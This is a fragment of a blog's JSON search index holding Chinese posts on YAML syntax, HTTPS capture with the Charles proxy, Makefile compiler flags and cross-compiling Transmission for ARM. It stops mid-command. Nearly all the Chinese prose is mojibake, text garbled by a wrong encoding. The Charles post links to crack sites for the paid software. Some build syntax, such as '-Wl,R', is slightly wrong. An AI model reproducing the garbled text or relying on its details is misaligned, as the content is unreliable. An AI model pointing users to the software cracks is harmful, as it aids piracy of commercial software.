æ—¶é—´\n- æ—¥æœŸ\n\næ•°å€¼ç›´æ¥ä»¥å­—é¢é‡çš„å½¢å¼è¡¨ç¤ºã€‚\n\n```javascript\nnumber: 12.30\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ number: 12.30 }\n```\n\n\n\nå¸ƒå°”å€¼ç”¨`true`å’Œ`false`è¡¨ç¤ºã€‚\n\n```javascript\nisSet: true\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ isSet: true }\n```\n\n\n\n`null`ç”¨`~`è¡¨ç¤ºã€‚\n\n```javascript\nparent: ~ \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ parent: null }\n```\n\n\n\næ—¶é—´é‡‡ç”¨ ISO8601 æ ¼å¼ã€‚\n\n```javascript\niso8601: 2001-12-14t21:59:43.10-05:00 \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ iso8601: new Date('2001-12-14t21:59:43.10-05:00') }\n```\n\n\n\næ—¥æœŸé‡‡ç”¨å¤åˆ iso8601 æ ¼å¼çš„å¹´ã€æœˆã€æ—¥è¡¨ç¤ºã€‚\n\n```javascript\ndate: 1976-07-31\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ date: new Date('1976-07-31') }\n```\n\n\n\nYAML å…è®¸ä½¿ç”¨ä¸¤ä¸ªæ„Ÿå¹å·ï¼Œå¼ºåˆ¶è½¬æ¢æ•°æ®ç±»å‹ã€‚\n\n```javascript\ne: !!str 123\nf: !!str true\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ e: '123', f: 'true' }\n```\n\n\n\n#### å­—ç¬¦ä¸²\n\nå­—ç¬¦ä¸²æ˜¯æœ€å¸¸è§ï¼Œä¹Ÿæ˜¯æœ€å¤æ‚çš„ä¸€ç§æ•°æ®ç±»å‹ã€‚å­—ç¬¦ä¸²é»˜è®¤ä¸ä½¿ç”¨å¼•å·è¡¨ç¤ºã€‚\n\n```javascript\nstr: è¿™æ˜¯ä¸€è¡Œå­—ç¬¦ä¸²\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'è¿™æ˜¯ä¸€è¡Œå­—ç¬¦ä¸²' }\n```\n\n\n\nå¦‚æœå­—ç¬¦ä¸²ä¹‹ä¸­åŒ…å«ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦æ”¾åœ¨å¼•å·ä¹‹ä¸­ã€‚\n\n```javascript\nstr: 'å†…å®¹ï¼š å­—ç¬¦ä¸²'\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'å†…å®¹: å­—ç¬¦ä¸²' }\n```\n\n\n\nå•å¼•å·å’ŒåŒå¼•å·éƒ½å¯ä»¥ä½¿ç”¨ï¼Œ`åŒå¼•å·ä¸ä¼šå¯¹ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€‚`\n\n```javascript\ns1: 'å†…å®¹\\nå­—ç¬¦ä¸²'\ns2: \"å†…å®¹\\nå­—ç¬¦ä¸²\"\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ s1: 'å†…å®¹\\\\nå­—ç¬¦ä¸²', s2: 'å†…å®¹\\nå­—ç¬¦ä¸²' }\n```\n\n\n\nå•å¼•å·ä¹‹ä¸­å¦‚æœè¿˜æœ‰å•å¼•å·ï¼Œå¿…é¡»è¿ç»­ä½¿ç”¨ä¸¤ä¸ªå•å¼•å·è½¬ä¹‰ã€‚\n\n```javascript\nstr: 'labor''s day' \n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'labor\\'s day' }\n```\n\n\n\nå­—ç¬¦ä¸²å¯ä»¥å†™æˆå¤šè¡Œï¼Œä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªå•ç©ºæ ¼ç¼©è¿›ã€‚æ¢è¡Œç¬¦ä¼šè¢«è½¬ä¸ºç©ºæ ¼ã€‚\n\n```javascript\nstr: è¿™æ˜¯ä¸€æ®µ\n  å¤šè¡Œ\n  å­—ç¬¦ä¸²\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'è¿™æ˜¯ä¸€æ®µ å¤šè¡Œ å­—ç¬¦ä¸²' }\n```\n\n\n\nå¤šè¡Œå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨`|`ä¿ç•™æ¢è¡Œç¬¦ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨`>`æŠ˜å æ¢è¡Œã€‚\n\n```javascript\nthis: |\n  Foo\n  Bar\nthat: >\n  Foo\n  Bar\n```\n\nè½¬ä¸º JavaScript ä»£ç å¦‚ä¸‹ã€‚\n\n```javascript\n{ this: 'Foo\\nBar\\n', that: 'Foo Bar\\n' }\n```\n\n\n\n`+`è¡¨ç¤ºä¿ç•™æ–‡å­—å—æœ«å°¾çš„æ¢è¡Œï¼Œ`-`è¡¨ç¤ºåˆ é™¤å­—ç¬¦ä¸²æœ«å°¾çš„æ¢è¡Œã€‚\n\n```javascript\ns1: |\n  Foo\n\ns2: |+\n  Foo\n\n\ns3: |-\n  Foo\n```\n\nè½¬ä¸º JavaScript ä»£ç å¦‚ä¸‹ã€‚\n\n```javascript\n{ s1: 'Foo\\n', s2: 'Foo\\n\\n\\n', s3: 'Foo' }\n```\n\n\n\nå­—ç¬¦ä¸²ä¹‹ä¸­å¯ä»¥æ’å…¥ HTML æ ‡è®°ã€‚\n\n```javascript\nmessage: |\n\n  <p style=\"color: red\">\n    æ®µè½\n  </p>\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ message: '\\n<p style=\"color: red\">\\n  æ®µè½\\n</p>\\n' }\n```\n\n\n\n#### å¼•ç”¨\n\né”šç‚¹`&`å’Œåˆ«å`*`ï¼Œå¯ä»¥ç”¨æ¥å¼•ç”¨ã€‚\n\n```javascript\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n\ntest:\n  database: myapp_test\n  <<: *defaults\n```\n\nç­‰åŒäºä¸‹é¢çš„ä»£ç ã€‚\n\n```javascript\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n\ntest:\n  database: myapp_test\n  adapter:  postgres\n  host:     localhost\n```\n\n`&`ç”¨æ¥å»ºç«‹é”šç‚¹ï¼ˆ`defaults`ï¼‰ï¼Œ`<<`è¡¨ç¤ºåˆå¹¶åˆ°å½“å‰æ•°æ®ï¼Œ`*`ç”¨æ¥å¼•ç”¨é”šç‚¹ã€‚\n\n\n\nä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚\n\n```javascript\n- &showell Steve \n- Clark \n- Brian \n- Oren \n- *showell \n```\n\nè½¬ä¸º JavaScript ä»£ç å¦‚ä¸‹ã€‚\n\n```javascript\n[ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]\n```\n\n\n\n## YAMLå®ç»ƒ\n\nhttp://nodeca.github.io/js-yaml/\n","tags":["yaml"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®","url":"%2Fp%2F2a640eb1.html","content":"\n\n\n\n### 1. Charles è½¯ä»¶ç ´è§£\n\nhttps://github.com/8enet/Charles-Crack\n\nhttps://www.zzzmode.com/mytools/charles/\n\nå‘ç°ä¸€ä¸ªæ›´å¥½ç”¨çš„æŠ“åŒ…è½¯ä»¶, å…è´¹\n\nhttps://github.com/ProxymanApp/Proxyman\n\n\n\n### 2. Charles Mac ChromeæŠ“åŒ…\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒChrome å’Œ Firefox æµè§ˆå™¨é»˜è®¤å¹¶ä¸ä½¿ç”¨ç³»ç»Ÿçš„ä»£ç†æœåŠ¡å™¨è®¾ç½®ï¼Œè€Œ Charles æ˜¯é€šè¿‡å°†è‡ªå·±è®¾ç½®æˆä»£ç†æœåŠ¡å™¨æ¥å®Œæˆå°åŒ…æˆªå–çš„ï¼Œæ‰€ä»¥åœ¨é»˜è®¤æƒ…å†µä¸‹æ— æ³•æˆªå– Chrome å’Œ Firefox æµè§ˆå™¨çš„ç½‘ç»œé€šè®¯å†…å®¹ã€‚\n\n1. è®¿é—®: chrome://settings/   \n2. ç„¶åä¸‹æ‹‰åˆ°æœ€åçš„é«˜çº§ï¼Œä¸‹æ¥åœ¨â€œç³»ç»Ÿâ€ï¼ˆå€’æ•°ç¬¬äºŒä¸ªï¼‰çš„æ¡ç›®ä¸‹æ‰¾åˆ°â€œæ‰“å¼€ä»£ç†è®¾ç½®â€ï¼Œç„¶ååŒå‡»æ‰“å¼€ä¹‹åï¼Œæ‰“å¼€ä¹‹åæ‰¾åˆ°ä»£ç†çš„tabç‚¹å¼€ï¼Œç‚¹å¼€ä¹‹åå¯ä»¥çœ‹åˆ°è¯·é€‰æ‹©ä¸€ä¸ªåè®®è¿›è¡Œé…ç½®ï¼Œè¿™ä¸ªæ—¶å€™æ‰¾åˆ°â€œç½‘é¡µä»£ç†(http)â€å’Œâ€œå®‰å…¨ç½‘é¡µä»£ç†(https)â€ï¼Œè¿›è¡Œç›¸åº”çš„é…ç½®å°±å¯ä»¥äº†ï¼Œä¸€èˆ¬æ¥è¯´è‡ªå·±ä¸åšå…¶ä»–å¤„ç†ï¼Œç›´æ¥é…ç½®ä»£ç†æœåŠ¡å™¨ä¸ºâ€œ127.0.0.1â€ï¼Œç«¯å£(å°±æ˜¯å†’å·:)åæ˜¯â€œ8888â€ã€‚\n3. å¦‚ä½•æŠ“httpsç½‘ç«™, åœ¨charleså·¦ä¾§è¯¥ç½‘å€å³é”® Enable SSL Proxying\n\n<!-- more -->\n\n### 3. Charles æ‰‹æœº HttpsæŠ“åŒ…\n\n##### 1. å®‰è£…ç”µè„‘ç«¯è¯ä¹¦  åœ¨`Help`èœå•ä¸‹çš„è·¯å¾„,ä¸‹è½½æ ¹è¯ä¹¦,å¹¶ä¸”åœ¨`é’¥åŒ™ä¸²`é‡Œè®¾ç½®ä¿¡ä»»æ­¤è¯ä¹¦.\n\n![1](CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/1.png)\n![2](CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/2.png)\n\n\n\n##### 2. å®‰è£…æ‰‹æœºè¯ä¹¦\n\n![3](CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/3.png)\n\n\nåœ¨ç›¸å…³çš„æ‰‹æœºä¸­æ‰“å¼€`Safari`,è¾“å…¥ä¸‹å›¾ä¸­é»˜è®¤çš„åœ°å€`chls.pro/ssl`ï¼Œæ‰‹æœºä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯ä¹¦ä¸‹è½½ç•Œé¢ï¼ŒæŒ‰ç…§æç¤ºå®‰è£…å³å¯.\n\nå®‰è£…å,è®¾ç½®ä¿¡ä»»æ­¤è¯ä¹¦.\n![4](CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/4.png)\n\n\n\n##### 3. é…ç½®æ‰‹æœºWifiä»£ç†å’Œå¼€å¯Charles SSL Proxy\n\n![5](CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/5.png)\n![6](CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/6.png)\n\n\n\næœ€æ–°ç³»ç»Ÿå¤šäº†ä¸€é“ç¨‹åº:\n\n+ éœ€è¦åœ¨å…³äºæœ¬æœº->è¯ä¹¦ä¿¡ä»»è®¾ç½®->å†æ¬¡ä¿¡ä»»ä¸€ä¸‹è¯ä¹¦\n\n\n\n### 4. Charleså¯ä»¥æŠ“å–httpsæŠ¥æ–‡çš„åŸç†\n\nåŸç†å°±æ˜¯: **ä¸­é—´äººæ”»å‡»**\n\n> Charles ä½œä¸ºä¸€ä¸ªä¸­é—´äººæ¥è¿›è¡Œ HTTPS çš„ä»£ç†ï¼Œè®©æˆ‘ä»¬æ£€æµ‹åˆ°æµè§ˆå™¨å’Œ SSL web æœåŠ¡ç«¯ä¹‹é—´çš„æ˜æ–‡é€šä¿¡ã€‚\n>  Charles æŠŠè‡ªå·±å˜æˆä¸€ä¸ªä¸­é—´äººæ¥è¾¾åˆ°è¿™ä¸€ç›®çš„ã€‚ä½ çš„æµè§ˆå™¨æ˜¯æ”¶ä¸åˆ°æœåŠ¡ç«¯è¯ä¹¦çš„ï¼ŒCharles ä¼šç”¨è‡ªå·±çš„æ ¹è¯ä¹¦åŠ¨æ€ç­¾å‘ä¸€å¼ è¯ä¹¦ï¼Œç„¶å Charles æ¥æ¥å—æœåŠ¡ç«¯çš„è¯ä¹¦ï¼Œä½ çš„æµè§ˆå™¨æ¥å— Charles çš„è¯ä¹¦ã€‚\n>  â€¦\n>  Charles ä»ç„¶é€šè¿‡ SSL ä¸æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ï¼Œä½†é€šä¿¡æ˜¯é€šè¿‡æµè§ˆå™¨åˆ° Charlesï¼Œç„¶ååœ¨ä» Charles åˆ°æœåŠ¡å™¨ã€‚\n\né€šä¿—ç‰ˆSSLåè®®åŸç†:\n\n- å°æ˜å’Œå°ç‹æ˜¯ä¸€å¯¹å¥½åŸºå‹ï¼Œä½†æ˜¯è¿œéš”ä¸‡æ°´åƒå±±ï¼Œåªèƒ½é€šè¿‡å†™ä¿¡æ¥ä¼ é€’æ¶ˆæ¯ã€‚ä¿©äººæ¯å¤©çš„ä¿¡ä»¶éƒ½æ˜¯é€šè¿‡é‚®é€’å‘˜å°çº¢æ¥ä¼ é€’çš„ï¼Œè¿™ä¿©äººæ¯å¤©çº¸æ¡ä¸Šæ˜æ–‡å†™ç€ä¿¡æ¯ï¼Œå°çº¢ä¹Ÿå¤©å¤©çœ‹çš„ä¸äº¦ä¹ä¹ï¼Œè¿™å°±æ˜¯ HTTPã€‚\n- æ—¶é—´ä¹…äº†ï¼Œä¸¤äººå‘ç°ä¸è¡Œï¼Œæ¯”å¦‚æœ‰æ—¶å€™ä¼šä¼ é€’ä¸€äº›ä¸å’Œè°çš„å†…å®¹ï¼Œä¸å¸Œæœ›å°çº¢è¿™æ ·çš„è…å¥³çœ‹åˆ°ï¼›äºæ˜¯å°æ˜çµæœºä¸€åŠ¨ï¼Œæ¢æˆè‘¬çˆ±å®¶æ—çš„æ€é©¬ç‰¹ç«æ˜Ÿæ–‡æ¥è¿›è¡Œé€šä¿¡ï¼›å°ç‹çœ‹åï¼Œå¿ƒé¢†ç¥ä¼šã€‚ç”±äºè½¬æ¢æ–¹å¼ä¸¤äººéƒ½çŸ¥é“ï¼Œè¿™å°±æ˜¯å¯¹ç§°åŠ å¯†æŠ€æœ¯ã€‚\n- ç„¶è€Œå¥½æ™¯ä¸é•¿ï¼Œå°çº¢å‹¤å­¦è‹¦ç»ƒï¼Œç»ˆäºç»ƒæˆäº†ç«æ˜Ÿæ–‡åçº§ï¼Œåˆèƒ½çœ‹æ‡‚ä¿©äººåŠ å¯†çš„å†…å®¹äº†ã€‚ä¿©äººå¿…é¡»è¦æ›´æ¢åŠ å¯†æ–¹å¼ï¼Œä½†æ˜¯æ›´æ¢çš„åŠ å¯†æ–¹å¼ä¹Ÿåªèƒ½é€šè¿‡å°çº¢æ¥ä¼ é€’ï¼Œæ‰€ä»¥è¿™ä¸ªåŠ å¯†çš„æ‰‹æ®µå¾ˆéš¾ç’ä½å°çº¢ï¼Œè¿™å°±æ˜¯ HTTP çš„ä¸å®‰å…¨æ€§ã€‚\n- æ­£å¥½å°æ˜æ˜¯ä¸€ä½åšå­¦çš„å“²â™‚å­¦å®¶ï¼Œä»–ç«‹åˆ»å†™äº†å°ä¿¡ç»™å°ç‹ï¼šæŠŠä½ å®¶å‚¨ç‰©é—´ç®±å­çš„ä¸Šé‚£æŠŠæŒ‚é”å¯„è¿‡æ¥ï¼å°ç‹çœ‹åç«‹åˆ»æ‹¿å‡ºäº†é‚£æŠŠ 82 å¹´çš„æŒ‚é”ï¼ŒæŠŠå®ƒæ‰“å¼€å¹¶å¯„ç»™äº†å°æ˜ã€‚è¿™ä¸ªé”å¤§å®¶éƒ½èƒ½çœ‹åˆ°ï¼Œä½†åªæœ‰å°ç‹æœ‰é’¥åŒ™ï¼Œè¿™å°±æ˜¯ä¼ è¯´ä¸­çš„éå¯¹ç§°åŠ å¯†ï¼Œé”å°±æ˜¯å…¬é’¥ï¼Œå°ç‹çš„é’¥åŒ™å°±æ˜¯ç§é’¥ã€‚\n- å°æ˜æ”¶åˆ°åï¼Œä»”ç»†ç ”ç©¶äº†é‚£æŠŠé”ï¼Œä¸Šé¢çƒ«ç€ã€éš”å£è€ç‹ã€å››ä¸ªéé‡‘å¤§å­—ï¼Œæ­£æ˜¯ç‹å®¶ç¥–ä¼ çš„é”ï¼Œè¿™å°±æ˜¯éªŒè¯æœåŠ¡ç«¯çš„æ•°å­—è¯ä¹¦ã€‚\n   äºæ˜¯å°æ˜æ”¾å¿ƒçš„æŠŠæ–°çš„åŠ å¯†æ–¹å¼å†™åœ¨ä¿¡ä¸­ï¼Œæ”¾åˆ°ç›’å­é‡Œï¼Œç„¶åç”¨é”é”ä¸Šã€‚ç”±äºå°çº¢æ²¡æœ‰é’¥åŒ™ï¼Œæ²¡æ³•æŸ¥çœ‹ç›’å­é‡Œåˆ°åº•å†™äº†å•¥ï¼Œåªèƒ½åŸæ ·é€è¿‡å»ã€‚å°ç‹æ”¶åˆ°åï¼Œç”¨è‡ªå·±çš„é’¥åŒ™æ‰“å¼€äº†é”ï¼Œè·å¾—äº†æ–°çš„åŠ å¯†æ–¹å¼ã€‚è¿™å°±å®Œæˆäº† SSL åè®®çš„æ¡æ‰‹ã€‚\n\nåˆ©ç”¨Charlesä¹‹åçš„åœºæ™¯:\n\n- å°çº¢æ‹¿åˆ°é”ä»¥åï¼Œå…ˆæ‰£ç€ä¸å‘ï¼Œç„¶åæå‡ºäº†è‡ªå·±çš„é”å¯„ç»™å°æ˜ï¼Œè¿™å°±æ˜¯ Charles ç­¾å‘äº†è‡ªå·±æ ¹è¯ä¹¦ï¼›\n- å°æ˜ä¸€çœ‹è¿™æŠŠé”ä¸æ˜¯æ­£å®—ç‹å®¶çš„ï¼Œä½†æ˜¯å°çº¢å®¶çš„é”ï¼Œä¼¼ä¹ä¹Ÿå¯ä»¥ç›¸ä¿¡ï¼Œè¿™å°±æ˜¯ä¿¡ä»»äº† Charles çš„æ ¹è¯ä¹¦ï¼›\n- å°æ˜æŠŠåŠ å¯†æ–¹å¼å†™è¿›å»ï¼Œç„¶åç”¨å°çº¢çš„é”é”èµ·æ¥äº†ï¼Œå°çº¢æ‰“å¼€ä¹‹åç ”ç©¶äº†åŠ å¯†æ–¹å¼ï¼Œå‘ç°ä¸¤äººæ˜¯åœ¨ç”¨æ°´æ˜Ÿæ–‡è¿›è¡Œäº¤æµï¼Œç¬é—´æ°´æ˜Ÿæ–‡ä¹Ÿè¾¾åˆ°äº†åçº§ï¼Œç„¶ååœ¨æ¢ä¸Šå°ç‹çš„é”é”ä¸Šäº†ç›’å­ï¼Œè¿˜ç»™äº†å°ç‹ï¼›\n- å°ç‹æ¯«ä¸çŸ¥æƒ…ï¼Œä¹‹åä¿©äººç”¨æ°´æ˜Ÿæ–‡è¿›è¡Œäº¤æµï¼Œä½†å†…å®¹å·²ç»å…¨è¢«å°çº¢æ•è·åˆ°äº†ã€‚\n\n\n\nå‚è€ƒé“¾æ¥:\n\n+ https://blog.devtang.com/2015/11/14/charles-introduction/  Charles ä»å…¥é—¨åˆ°ç²¾é€š\n+ https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html  å›¾è§£SSL/TLSåè®®\n+ https://www.laoqingcai.com/https-mitm/ ä¸­é—´äººæ”»å‡»","tags":["charles"],"categories":["è½¯ä»¶"]},{"title":"makefileçš„é€‰é¡¹CFLAGSã€CPPFLAGSã€LDFLAGSå’ŒLIBSçš„åŒºåˆ«","url":"%2Fp%2F271bdf2a.html","content":"\n\n\nå…ˆçœ‹ä¸€ä¸ªä¾‹å­:\n\n```shell\nexport CFLAGS=\"-I/root/ARM/opt/include\"\nexport LDFLAGS=\"-L/root/ARM/opt/lib\"\n```\n\n\n\n**CFLAGS**ï¼š æŒ‡å®šå¤´æ–‡ä»¶ï¼ˆ.hæ–‡ä»¶ï¼‰çš„è·¯å¾„ï¼Œå¦‚ï¼šCFLAGS=-I/usr/include -I/path/includeã€‚åŒæ ·åœ°ï¼Œå®‰è£…ä¸€ä¸ªåŒ…æ—¶ä¼šåœ¨å®‰è£…è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªincludeç›®å½•ï¼Œå½“å®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜æ—¶ï¼Œè¯•ç€æŠŠä»¥å‰å®‰è£…çš„åŒ…çš„includeç›®å½•åŠ å…¥åˆ°è¯¥å˜é‡ä¸­æ¥ã€‚\n\n**LDFLAGS**ï¼šgcc ç­‰ç¼–è¯‘å™¨ä¼šç”¨åˆ°çš„ä¸€äº›ä¼˜åŒ–å‚æ•°ï¼Œä¹Ÿå¯ä»¥åœ¨é‡Œé¢æŒ‡å®šåº“æ–‡ä»¶çš„ä½ç½®ã€‚ç”¨æ³•ï¼šLDFLAGS=-L/usr/lib -L/path/to/your/libã€‚æ¯å®‰è£…ä¸€ä¸ªåŒ…éƒ½å‡ ä¹ä¸€å®šçš„ä¼šåœ¨å®‰è£…ç›®å½•é‡Œå»ºç«‹ä¸€ä¸ªlibç›®å½•ã€‚å¦‚æœæ˜æ˜å®‰è£…äº†æŸä¸ªåŒ…ï¼Œè€Œå®‰è£…å¦ä¸€ä¸ªåŒ…æ—¶ï¼Œå®ƒæ„£æ˜¯è¯´æ‰¾ä¸åˆ°ï¼Œå¯ä»¥æŠ’é‚£ä¸ªåŒ…çš„libè·¯å¾„åŠ å…¥çš„LDFALGSä¸­è¯•ä¸€ä¸‹ã€‚\n\n**LIBS**ï¼šå‘Šè¯‰é“¾æ¥å™¨è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ï¼Œå¦‚LIBS = -lpthread -liconv\n\n<!-- more -->\n\n### CFLAGS,CXXFLAGS,CPPFLAGSçš„åŒºåˆ«\n\nCFLAGS è¡¨ç¤ºç”¨äº C ç¼–è¯‘å™¨çš„é€‰é¡¹\n\nCXXFLAGS è¡¨ç¤ºç”¨äº C++ ç¼–è¯‘å™¨çš„é€‰é¡¹ã€‚\n\nCPPFLAGS å¯ä»¥ ç”¨äº C å’Œ C++ ä¸¤è€…ã€‚\n\n\n\n### LDFLAGS,LIBSçš„åŒºåˆ«\n\nLDFLAGSæ˜¯é€‰é¡¹ï¼ŒLIBSæ˜¯è¦é“¾æ¥çš„åº“ã€‚éƒ½æ˜¯å–‚ç»™ldçš„ï¼Œåªä¸è¿‡ä¸€ä¸ªæ˜¯å‘Šè¯‰ldæ€ä¹ˆåƒï¼Œä¸€ä¸ªæ˜¯å‘Šè¯‰ldè¦åƒä»€ä¹ˆã€‚\n\nçœ‹çœ‹å¦‚ä¸‹é€‰é¡¹ï¼š\n\n```shell\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib\nLIBS = -lmysqlclient -liconv\n```\n\nè¿™å°±æ˜ç™½äº†ã€‚LDFLAGSå‘Šè¯‰é“¾æ¥å™¨ä»å“ªé‡Œå¯»æ‰¾åº“æ–‡ä»¶ï¼ŒLIBSå‘Šè¯‰é“¾æ¥å™¨è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ã€‚ä¸è¿‡ä½¿ç”¨æ—¶é“¾æ¥é˜¶æ®µè¿™ä¸¤ä¸ªå‚æ•°éƒ½ä¼šåŠ ä¸Šï¼Œæ‰€ä»¥ä½ å³ä½¿å°†è¿™ä¸¤ä¸ªçš„å€¼äº’æ¢ï¼Œä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚\n\n\n\nè¯´åˆ°è¿™é‡Œï¼Œè¿›ä¸€æ­¥è¯´è¯´LDFLAGSæŒ‡å®š-Lè™½ç„¶èƒ½è®©é“¾æ¥å™¨æ‰¾åˆ°åº“è¿›è¡Œé“¾æ¥ï¼Œä½†æ˜¯è¿è¡Œæ—¶é“¾æ¥å™¨å´æ‰¾ä¸åˆ°è¿™ä¸ªåº“ï¼Œå¦‚æœè¦è®©è½¯ä»¶è¿è¡Œæ—¶åº“æ–‡ä»¶çš„è·¯å¾„ä¹Ÿå¾—åˆ°æ‰©å±•ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¢åŠ è¿™ä¸¤ä¸ªåº“ç»™\"-Wl,R\"\n\n```\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\n```\n\nå¦‚ æœåœ¨æ‰§è¡Œ./configureä»¥å‰è®¾ç½®ç¯å¢ƒå˜é‡export LDFLAGS=\"-L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\" ï¼Œæ³¨æ„è®¾ç½®ç¯å¢ƒå˜é‡ç­‰å·ä¸¤è¾¹ä¸å¯ä»¥æœ‰ç©ºæ ¼ï¼Œè€Œä¸”è¦åŠ ä¸Šå¼•å·å“¦ï¼ˆshellçš„ç”¨æ³•ï¼‰ã€‚æ‰§è¡Œconfigureä»¥åï¼ŒMakefileå°†ä¼šè®¾ç½®è¿™ä¸ªé€‰é¡¹ï¼Œ é“¾æ¥æ—¶ä¼šæœ‰è¿™ä¸ªå‚æ•°ï¼Œç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œç¨‹åºçš„åº“æ–‡ä»¶æœç´¢è·¯å¾„å°±å¾—åˆ°æ‰©å±•äº†ã€‚\n\n\n\n### å‚è€ƒé“¾æ¥:\n\nhttps://forum.golangbridge.org/t/cflags-ldflags-documentation-somewhere/4520/10","tags":["makefile"],"categories":["ç³»ç»Ÿ"]},{"title":"äº¤å‰ç¼–è¯‘arm-transmission-2.94","url":"%2Fp%2F73da9612.html","content":"\n\n\n# 1. ç¼–è¯‘å¹³å°å‡†å¤‡å·¥ä½œ\n\n1. ä¸‹è½½arm-none-linux-gnueabi-gcc\n\n2. ä¸‹è½½transmission-2.94\n\n3. æ–°å»ºARMæ–‡ä»¶å¤¹\n\n4. è§£å‹arm-none-linux-gnueabi-gccå’Œtransmission-2.94åˆ°ARMæ–‡ä»¶å¤¹\n\n5. è®¾ç½®ç¼–è¯‘å¹³å°ç¯å¢ƒå˜é‡\n\n   ```shell\n   export PATH=\"/root/ARM/external-toolchain/bin:$PATH\"\n   export cross=arm-none-linux-gnueabi-\n   export CC=\"${cross}gcc\"\n   ```\n\n6. ç¼–è¯‘çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„çœ‹log, æ˜¯arm-none-linux-gnueabi-gccç¼–è¯‘çš„æ‰æ˜¯æ­£ç¡®çš„\n\n<!-- more -->\n\n\n\n# 2. ç›®æ ‡å¹³å°å¼€å§‹ç¼–è¯‘\n\n### 2.1 transmission\n\n```shell\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd_daemon  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/ARM/transmission-2.94/a(ç»å¯¹è·¯å¾„)\n```\n\n\n\ngit cloneä¸‹æ¥çš„éœ€è¦æ‰§è¡Œ./autogen.sh\n\n```shell\n./autogen.sh --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\" \n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/transmission/a(ç»å¯¹è·¯å¾„)\n```\n\n\n\né”™è¯¯1. å‡ºç°No package 'libevent' found ->å®‰è£…libevent\n\né”™è¯¯2. fatal error: curl/curl.h: No such file or directory -> å®‰è£…curl\n\né”™è¯¯3. rpcimpl.c:16:18: fatal error: zlib.h: No such file or directory ->å®‰è£…zlib\n\né”™è¯¯4. fatal error: systemd/sd-daemon.h: No such file or directory ->éœ€è¦å®‰è£…systemd, æ­¤å¤„å¼ºçƒˆå»ºè®®ä½¿ç”¨`--without-systemd_daemon`é€‰é¡¹, å¦åˆ™ç¼–è¯‘systemdåˆæ˜¯ä¸€å †ä¾èµ–\n\n\n\n### 2.2 libevent\n\n```shell\nwget https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz\ncd 